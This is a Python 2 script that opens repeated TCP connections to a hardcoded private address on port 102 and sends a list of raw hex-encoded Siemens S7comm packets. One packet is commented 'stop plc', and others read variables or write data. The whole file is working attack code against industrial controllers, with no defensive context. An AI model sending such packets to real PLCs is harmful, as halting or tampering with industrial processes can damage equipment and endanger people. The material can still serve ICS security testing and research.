import sys
import socket
import binascii
import random

server_ip = "192.168.100.227"
server_port = 102

payloads = ["0300001902f08032010000550100080000f0000001000100f0",
            "030000241fe00000011200c1020620c21053494d415449432d524f4f542d484d49c0010a",
            "0300003702f080320100004c1f002600000403120a10020001000083000000120a10020001000082000000120a10020001000081000000",
            "0300002702f080320100000002000e00080501120a100200040000830000000004002077100002",
            "0300002102f080320700003d00000800080001120411440100ff09000400740000", # s7comm.request.read-var.db-number
            "0300001f02f080320700000500000800060001120411430200ff0900023041",
            "0300002702f080320100000002000e00080501120a1002000400008300000000040020a9100001",
            "0300001d02f0803207000008000008000400011204114301000a000000",
            "0300001f02f080320700000b00000800060001120411430200ff0900023038",
            "0300003102f080320100000e00002000001a00010000000000095f30413030303031500d31303030353030303030343030",
            "0300002302f080320100000100001200001b00000000000000095f3041303030303150",
            "0300002102f0803201000000020010000029000000000009505f50524f4752414d", # program invo - stop plc
            "030000f702f080320300000100000200e200001b0100de00fb70700101050a0001000001f400000000029147602bb5029147602bb5001c000000000190000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
          ]

# Create a TCP/IP socket
#sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = (server_ip, server_port)
# Connect the socket to the port on the server given by the caller
print >>sys.stderr, 'connecting to %s port %s' % server_address
#sock.settimeout(15.0)
try:
    #sock.connect(server_address)
    #print "hehe"
    #payload=random.choice(payloads)
    for payload in payloads:
        print "ff"
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(15.0)
        sock.connect(server_address)
        print payload
        packet = binascii.unhexlify(payload)
        print "REQ: %s" % binascii.hexlify(packet)
        print "Sent: %d " % sock.send(packet)
        print "ss"
        #response = sock.recv(1500)
        #print "RES: %s" % binascii.hexlify(response)
        sock.close()
        print "ww"
except Exception as e:
    print "ERR: %s" % str(e)
    sock.close()

